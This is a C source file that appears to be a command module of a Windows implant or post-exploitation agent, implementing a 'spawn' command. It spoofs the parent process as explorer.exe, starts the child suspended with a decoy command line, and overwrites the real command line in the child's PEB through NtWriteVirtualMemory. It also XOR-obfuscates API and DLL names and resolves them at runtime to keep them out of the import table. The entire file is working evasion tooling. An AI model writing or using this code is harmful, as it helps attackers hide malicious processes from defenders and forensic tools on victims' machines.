#include "commands.h"
#include "inject.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define PP_CMDLINE_OFF  0x70   /* RTL_USER_PROCESS_PARAMETERS.CommandLine (x64) */
#define PEB_PARAMS_OFF  0x20   /* PEB.ProcessParameters (x64) */

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

/* Dynamic ResumeThread — removes from IAT */
static DWORD _rt(HANDLE h)
{
    static DWORD (WINAPI *fn)(HANDLE) = NULL;
    if (!fn) {
        char fs[16], ks[16]; volatile unsigned char xk = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_ResumeThread); i++) fs[i] = (char)(EVS_fn_ResumeThread[i] ^ xk);
        fs[sizeof(EVS_fn_ResumeThread)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_kernel32); i++) ks[i] = (char)(EVS_dll_kernel32[i] ^ xk);
        ks[sizeof(EVS_dll_kernel32)] = '\0';
        HMODULE m = _peb_module(ks);
        SecureZeroMemory(ks, sizeof(ks));
        if (m) fn = (DWORD (WINAPI *)(HANDLE))GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    return fn ? fn(h) : (DWORD)-1;
}

typedef NTSTATUS (WINAPI *NtQIP_t)(HANDLE, DWORD, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI  *NtRVM_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI  *NtWVM_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

/* NtReadVirtualMemory — removes ReadProcessMemory from IAT */
static NtRVM_t _get_nrvm(void) {
    static NtRVM_t fn = NULL;
    if (!fn) {
        char fs[24], ns[12]; volatile unsigned char k = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_NtReadVirtualMemory); i++) fs[i] = (char)(EVS_fn_NtReadVirtualMemory[i] ^ k);
        fs[sizeof(EVS_fn_NtReadVirtualMemory)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_ntdll); i++) ns[i] = (char)(EVS_dll_ntdll[i] ^ k);
        ns[sizeof(EVS_dll_ntdll)] = '\0';
        HMODULE m = _peb_module(ns); SecureZeroMemory(ns, sizeof(ns));
        if (m) fn = (NtRVM_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    return fn;
}

/* NtWriteVirtualMemory — removes WriteProcessMemory from IAT */
static NtWVM_t _get_nwvm(void) {
    static NtWVM_t fn = NULL;
    if (!fn) {
        char fs[24], ns[12]; volatile unsigned char k = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_NtWriteVirtualMemory); i++) fs[i] = (char)(EVS_fn_NtWriteVirtualMemory[i] ^ k);
        fs[sizeof(EVS_fn_NtWriteVirtualMemory)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_ntdll); i++) ns[i] = (char)(EVS_dll_ntdll[i] ^ k);
        ns[sizeof(EVS_dll_ntdll)] = '\0';
        HMODULE m = _peb_module(ns); SecureZeroMemory(ns, sizeof(ns));
        if (m) fn = (NtWVM_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    return fn;
}

/* Minimal PROCESS_BASIC_INFORMATION */
typedef struct {
    LONG_PTR   ExitStatus;
    PVOID      PebBaseAddress;
    ULONG_PTR  AffinityMask;
    LONG_PTR   BasePriority;
    ULONG_PTR  UniqueProcessId;
    ULONG_PTR  InheritedFromUniqueProcessId;
} PBI;

static DWORD _find_explorer(void)
{
    char _en[13]; volatile unsigned char _k = EVS_KEY;
    for (int i = 0; i < (int)sizeof(EVS_str_explorer_exe); i++) _en[i] = (char)(EVS_str_explorer_exe[i] ^ _k);
    _en[sizeof(EVS_str_explorer_exe)] = '\0';

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) { SecureZeroMemory(_en, sizeof(_en)); return 0; }
    PROCESSENTRY32 pe = {sizeof(pe)};
    DWORD pid = 0;
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, _en) == 0)
            { pid = pe.th32ProcessID; break; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    SecureZeroMemory(_en, sizeof(_en));
    return pid;
}

int cmd_spawn(const char *exe_path, const char *fake_cmdline,
              const char *real_cmdline,
              char *output_buf, size_t output_size)
{
    if (!exe_path || !exe_path[0] || !fake_cmdline || !fake_cmdline[0]) {
        snprintf(output_buf, output_size,
                 "[spawn] usage: spawn <exe> <fake_args> [real_args]\n");
        return -1;
    }

    /* build fake cmdline: pad so real cmdline fits in the same buffer */
    char fake_full[2048];
    snprintf(fake_full, sizeof(fake_full), "%s %s", exe_path, fake_cmdline);

    size_t real_len = real_cmdline ? strlen(real_cmdline) : 0;
    size_t fake_len = strlen(fake_full);
    if (real_len > fake_len) {
        /* pad with spaces */
        size_t needed = real_len - fake_len;
        if (needed < sizeof(fake_full) - fake_len - 1) {
            for (size_t i = 0; i < needed; i++)
                fake_full[fake_len + i] = ' ';
            fake_full[fake_len + needed] = '\0';
        }
    }

    /* PPID spoofing: use explorer.exe as parent */
    DWORD ppid = _find_explorer();

    STARTUPINFOEXA si;
    memset(&si, 0, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;

    SIZE_T attr_sz = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST attr_list = NULL;

    if (ppid) {
        InitializeProcThreadAttributeList(NULL, 1, 0, &attr_sz);
        attr_list = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attr_sz);
        if (attr_list) {
            InitializeProcThreadAttributeList(attr_list, 1, 0, &attr_sz);
            HANDLE hParent = inject_nt_open_process(ppid, PROCESS_CREATE_PROCESS);
            if (hParent) {
                UpdateProcThreadAttribute(attr_list, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &hParent, sizeof(hParent), NULL, NULL);
                /* hParent closed after CreateProcess */
            }
            si.lpAttributeList = attr_list;
        }
    }

    PROCESS_INFORMATION pi = {0};
    BOOL ok = CreateProcessA(
        exe_path,
        fake_full,
        NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL,
        &si.StartupInfo, &pi);

    if (attr_list) {
        DeleteProcThreadAttributeList(attr_list);
        free(attr_list);
    }

    if (!ok) {
        snprintf(output_buf, output_size,
                 "[spawn] CreateProcess failed: %lu\n", GetLastError());
        return -1;
    }

    /* if no real cmdline, just resume and return */
    if (!real_cmdline || !real_cmdline[0]) {
        _rt(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        snprintf(output_buf, output_size,
                 "[spawn] pid=%lu  fake_cmdline=%s\n",
                 (unsigned long)pi.dwProcessId, fake_full);
        return 0;
    }

    /* find CommandLine.Buffer in target PEB */
    char _sqn[28], _sn[12]; volatile unsigned char _xk = EVS_KEY;
    for (int _i = 0; _i < (int)sizeof(EVS_fn_NtQueryInformationProcess); _i++) _sqn[_i] = (char)(EVS_fn_NtQueryInformationProcess[_i] ^ _xk);
    _sqn[sizeof(EVS_fn_NtQueryInformationProcess)] = '\0';
    for (int _i = 0; _i < (int)sizeof(EVS_dll_ntdll); _i++) _sn[_i] = (char)(EVS_dll_ntdll[_i] ^ _xk);
    _sn[sizeof(EVS_dll_ntdll)] = '\0';
    NtQIP_t pfnQIP = (NtQIP_t)(void *)GetProcAddress(_peb_module(_sn), _sqn);
    SecureZeroMemory(_sqn, sizeof(_sqn)); SecureZeroMemory(_sn, sizeof(_sn));

    if (!pfnQIP) goto resume;

    PBI pbi = {0};
    NTSTATUS st = pfnQIP(pi.hProcess, 0 /* ProcessBasicInformation */,
                          &pbi, sizeof(pbi), NULL);
    if (st) goto resume;

    /* read ProcessParameters pointer from PEB */
    PVOID params_ptr = NULL;
    { NtRVM_t _r = _get_nrvm();
      if (!_r || _r(pi.hProcess, (BYTE *)pbi.PebBaseAddress + PEB_PARAMS_OFF,
                    &params_ptr, sizeof(PVOID), NULL) || !params_ptr)
          goto resume; }

    /* read CommandLine UNICODE_STRING fields */
    USHORT cl_len = 0, cl_maxlen = 0;
    PWSTR  cl_buf  = NULL;
    { NtRVM_t _r = _get_nrvm();
      if (_r) {
          _r(pi.hProcess, (BYTE *)params_ptr + PP_CMDLINE_OFF,
             &cl_len, sizeof(USHORT), NULL);
          _r(pi.hProcess, (BYTE *)params_ptr + PP_CMDLINE_OFF + 2,
             &cl_maxlen, sizeof(USHORT), NULL);
          _r(pi.hProcess, (BYTE *)params_ptr + PP_CMDLINE_OFF + 8,
             &cl_buf, sizeof(PWSTR), NULL);
      }
    }

    if (!cl_buf || cl_maxlen == 0) goto resume;

    /* convert real cmdline to UTF-16 */
    WCHAR real_wide[2048] = {0};
    int real_wchars = MultiByteToWideChar(CP_ACP, 0, real_cmdline, -1,
                                           real_wide, 2048);
    if (real_wchars <= 0) goto resume;

    USHORT real_bytes = (USHORT)((real_wchars - 1) * 2);

    if (real_bytes > cl_maxlen) {
        /* Real too long — skip overwrite, just resume with fake */
        goto resume;
    }

    /* Overwrite the CommandLine buffer in target */
    { NtWVM_t _w = _get_nwvm();
      if (_w) {
          _w(pi.hProcess, cl_buf, real_wide, real_bytes + 2, NULL);
          _w(pi.hProcess, (BYTE *)params_ptr + PP_CMDLINE_OFF,
             &real_bytes, sizeof(USHORT), NULL);
      }
    }

resume:
    _rt(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    snprintf(output_buf, output_size,
             "[spawn] pid=%lu\n"
             "  visible: %s\n"
             "  actual:  %s\n",
             (unsigned long)pi.dwProcessId,
             fake_full,
             real_cmdline ? real_cmdline : "(same as visible)");
    return 0;
}
